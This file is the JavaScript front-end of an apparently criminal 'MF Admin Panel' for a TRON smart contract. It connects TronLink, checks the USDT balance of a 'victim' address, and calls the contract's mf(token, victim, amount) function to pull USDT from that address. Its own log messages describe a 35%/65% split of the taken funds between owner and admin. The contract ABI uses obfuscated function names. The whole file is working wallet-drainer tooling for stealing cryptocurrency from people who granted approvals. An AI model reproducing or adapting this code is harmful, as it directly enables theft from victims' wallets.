/* ========================================
   MF Admin Panel — Application Logic
   TRON Contract: TFgcNnjXThWwB39iqnZ3v7Fkqm8DjFAWLs
   Developed by @X_ROAV
   ======================================== */

const CONTRACT_ADDRESS = 'TFgcNnjXThWwB39iqnZ3v7Fkqm8DjFAWLs';
const USDT_TOKEN_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const USDT_DECIMALS = 6;

// Full ABI for contract interaction
const CONTRACT_ABI = [
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [
            { "name": "token", "type": "address" },
            { "name": "victim", "type": "address" },
            { "name": "amount", "type": "uint256" }
        ],
        "name": "mf",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "OWNER_COMMISSION_PERCENT",
        "outputs": [{ "name": "", "type": "uint256" }],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "oxzxr",
        "outputs": [{ "name": "", "type": "address" }],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "cwxsa",
        "outputs": [{ "name": "", "type": "address" }],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{ "name": "", "type": "address" }],
        "name": "acnvc",
        "outputs": [{ "name": "", "type": "bool" }],
        "stateMutability": "view",
        "type": "function"
    }
];

// TRC20 ABI for balance check
const TRC20_ABI = [
    {
        "inputs": [{ "name": "owner", "type": "address" }],
        "name": "balanceOf",
        "outputs": [{ "name": "", "type": "uint256" }],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "decimals",
        "outputs": [{ "name": "", "type": "uint8" }],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "symbol",
        "outputs": [{ "name": "", "type": "string" }],
        "stateMutability": "view",
        "type": "function"
    }
];

let tronWeb = null;
let isConnected = false;

// ========================================
// Utility Functions
// ========================================

function getTime() {
    return new Date().toLocaleTimeString('en-US', { hour12: false });
}

function addLog(message, type = 'info') {
    const logsBody = document.getElementById('logsBody');
    const entry = document.createElement('div');
    entry.className = `log-entry ${type}`;

    const badgeMap = {
        info: 'SYS',
        success: 'OK',
        error: 'ERR',
        warn: 'WARN',
        tx: 'TX'
    };

    entry.innerHTML = `
        <span class="log-time">${getTime()}</span>
        <span class="log-badge ${type}">${badgeMap[type] || 'LOG'}</span>
        <span class="log-msg">${message}</span>
    `;

    logsBody.appendChild(entry);
    logsBody.scrollTop = logsBody.scrollHeight;
}

function clearLogs() {
    const logsBody = document.getElementById('logsBody');
    logsBody.innerHTML = '';
    addLog('Logs cleared.', 'info');
}

function showToast(message, type = 'info') {
    const existing = document.querySelector('.toast');
    if (existing) existing.remove();

    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.textContent = message;
    document.body.appendChild(toast);

    setTimeout(() => toast.remove(), 3500);
}

function setStatus(text, type = 'idle') {
    const status = document.getElementById('panelStatus');
    status.innerHTML = `
        <span class="status-dot ${type}"></span>
        <span>${text}</span>
    `;
}

function setButtonLoading(loading) {
    const btnContent = document.querySelector('.btn-content');
    const btnLoading = document.querySelector('.btn-loading');
    const btn = document.getElementById('executeBtn');

    if (loading) {
        btnContent.classList.add('hidden');
        btnLoading.classList.remove('hidden');
        btn.disabled = true;
    } else {
        btnContent.classList.remove('hidden');
        btnLoading.classList.add('hidden');
        btn.disabled = false;
    }
}

async function copyText(text) {
    try {
        await navigator.clipboard.writeText(text);
        showToast('Copied to clipboard!', 'success');
    } catch {
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
        showToast('Copied!', 'success');
    }
}

async function pasteToField(fieldId) {
    try {
        const text = await navigator.clipboard.readText();
        document.getElementById(fieldId).value = text.trim();
        document.getElementById(fieldId).dispatchEvent(new Event('input'));
        showToast('Pasted!', 'info');
    } catch {
        showToast('Paste not available — use Ctrl+V', 'error');
    }
}

// ========================================
// TronLink Connection
// ========================================

async function connectWallet() {
    addLog('Attempting to connect TronLink...', 'info');

    if (typeof window.tronLink === 'undefined' && typeof window.tronWeb === 'undefined') {
        addLog('TronLink extension not detected! Please install TronLink.', 'error');
        showToast('TronLink not found! Install TronLink extension.', 'error');
        return;
    }

    try {
        if (window.tronLink) {
            const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
            if (res.code === 200 || res.code === 4001) {
                // connected or already connected
            }
        }

        await new Promise(resolve => setTimeout(resolve, 500));

        if (window.tronWeb && window.tronWeb.ready) {
            tronWeb = window.tronWeb;
            isConnected = true;

            const addr = tronWeb.defaultAddress.base58;
            const shortAddr = addr.slice(0, 6) + '...' + addr.slice(-4);

            document.getElementById('walletText').textContent = shortAddr;
            const badge = document.getElementById('walletStatus');
            badge.classList.remove('disconnected');
            badge.classList.add('connected');

            document.getElementById('connectBtn').textContent = 'Connected ✓';
            document.getElementById('connectBtn').style.opacity = '0.7';

            addLog(`Connected: ${addr}`, 'success');
            showToast('TronLink Connected!', 'success');

            checkAuthorization(addr);
        } else {
            addLog('TronWeb not ready. Please unlock TronLink and try again.', 'error');
            showToast('TronLink not ready. Unlock your wallet.', 'error');
        }
    } catch (err) {
        addLog(`Connection failed: ${err.message || err}`, 'error');
        showToast('Connection failed!', 'error');
    }
}

async function checkAuthorization(addr) {
    try {
        const contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
        const isAuthorized = await contract.acnvc(addr).call();
        if (isAuthorized) {
            addLog('✅ Your address is authorized on contract.', 'success');
        } else {
            addLog('⚠️ Your address is NOT authorized. mf() will revert.', 'warn');
            showToast('Warning: Your address is not authorized!', 'error');
        }
    } catch (err) {
        addLog(`Auth check failed: ${err.message || 'unknown error'}`, 'warn');
    }
}

// ========================================
// Balance Check (uses auto-set USDT token)
// ========================================

async function checkBalance() {
    if (!isConnected || !tronWeb) {
        showToast('Connect TronLink first!', 'error');
        return;
    }

    const victimAddr = document.getElementById('victimAddress').value.trim();

    if (!victimAddr) {
        showToast('Enter Source address first.', 'error');
        return;
    }

    try {
        addLog(`Checking USDT balance of ${victimAddr.slice(0, 8)}...`, 'info');

        const tokenContract = await tronWeb.contract(TRC20_ABI, USDT_TOKEN_ADDRESS);

        const balanceRaw = await tokenContract.balanceOf(victimAddr).call();
        const balance = parseFloat(balanceRaw.toString()) / Math.pow(10, USDT_DECIMALS);

        document.getElementById('balanceInfo').textContent = `Balance: ${balance.toLocaleString()} USDT`;
        addLog(`Balance: ${balance.toLocaleString()} USDT (${balanceRaw.toString()} raw)`, 'success');
        showToast(`Balance: ${balance.toLocaleString()} USDT`, 'info');
    } catch (err) {
        addLog(`Balance check failed: ${err.message || err}`, 'error');
        showToast('Failed to check balance.', 'error');
    }
}

// ========================================
// Execute MF Function
// ========================================

async function executeMF(event) {
    event.preventDefault();

    if (!isConnected || !tronWeb) {
        showToast('Connect TronLink first!', 'error');
        addLog('Cannot execute: TronLink not connected.', 'error');
        return;
    }

    const victimAddr = document.getElementById('victimAddress').value.trim();
    const amountStr = document.getElementById('amount').value.trim();

    if (!victimAddr || !amountStr) {
        showToast('Fill in all fields!', 'error');
        return;
    }

    // Convert amount to raw (USDT has 6 decimals)
    let rawAmount;
    try {
        const parsedAmount = parseFloat(amountStr);
        if (isNaN(parsedAmount) || parsedAmount <= 0) {
            throw new Error('Invalid amount');
        }
        rawAmount = BigInt(Math.floor(parsedAmount * Math.pow(10, USDT_DECIMALS)));
    } catch (err) {
        showToast('Invalid amount!', 'error');
        addLog(`Invalid amount: ${amountStr}`, 'error');
        return;
    }

    setButtonLoading(true);
    setStatus('Processing...', 'processing');

    addLog('───────────────────────────────', 'info');
    addLog('Starting mf() execution...', 'tx');
    addLog(`Token: USDT (${USDT_TOKEN_ADDRESS})`, 'info');
    addLog(`Source: ${victimAddr}`, 'info');
    addLog(`Amount: ${amountStr} USDT (raw: ${rawAmount.toString()})`, 'info');
    addLog(`Commission: 35% → Owner | 65% → Admin`, 'info');

    try {
        const contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);

        addLog('Sending transaction to TRON network...', 'tx');
        addLog('Please confirm in TronLink...', 'warn');

        const tx = await contract.mf(USDT_TOKEN_ADDRESS, victimAddr, rawAmount.toString()).send({
            feeLimit: 100_000_000,
            callValue: 0,
            shouldPollResponse: false
        });

        const txId = typeof tx === 'string' ? tx : (tx.txid || tx.transaction?.txID || JSON.stringify(tx));

        addLog(`✅ Transaction submitted!`, 'success');
        addLog(`TX Hash: ${txId}`, 'tx');
        addLog('───────────────────────────────', 'info');

        setStatus('Success!', 'success');
        showToast('Transaction submitted successfully!', 'success');

        showSuccessOverlay(txId);

    } catch (err) {
        const errMsg = err.message || err.error || JSON.stringify(err);
        addLog(`❌ Transaction failed: ${errMsg}`, 'error');
        addLog('───────────────────────────────', 'info');
        setStatus('Failed', 'error');
        showToast('Transaction failed!', 'error');
    } finally {
        setButtonLoading(false);
    }
}

// ========================================
// Success Overlay
// ========================================

function showSuccessOverlay(txId) {
    const overlay = document.getElementById('successOverlay');
    const video = document.getElementById('successVideo');
    const txHash = document.getElementById('successTxHash');

    txHash.textContent = `TX: ${txId}`;
    overlay.classList.remove('hidden');

    video.currentTime = 0;
    video.play().catch(() => {});
}

function closeSuccess() {
    const overlay = document.getElementById('successOverlay');
    const video = document.getElementById('successVideo');

    video.pause();
    video.currentTime = 0;
    overlay.classList.add('hidden');
}

// ========================================
// Auto-Connect on Load
// ========================================

window.addEventListener('load', () => {
    document.getElementById('footerYear').textContent = new Date().getFullYear();

    // Try auto-connect after a short delay
    setTimeout(() => {
        if (window.tronWeb && window.tronWeb.ready) {
            connectWallet();
        }
    }, 1000);
});

// Listen for TronLink events
window.addEventListener('message', (e) => {
    if (e.data?.message?.action === 'setAccount') {
        if (e.data.message.data?.address) {
            addLog('Account changed, reconnecting...', 'info');
            connectWallet();
        }
    }
    if (e.data?.message?.action === 'setNode') {
        addLog('Network changed.', 'warn');
    }
});
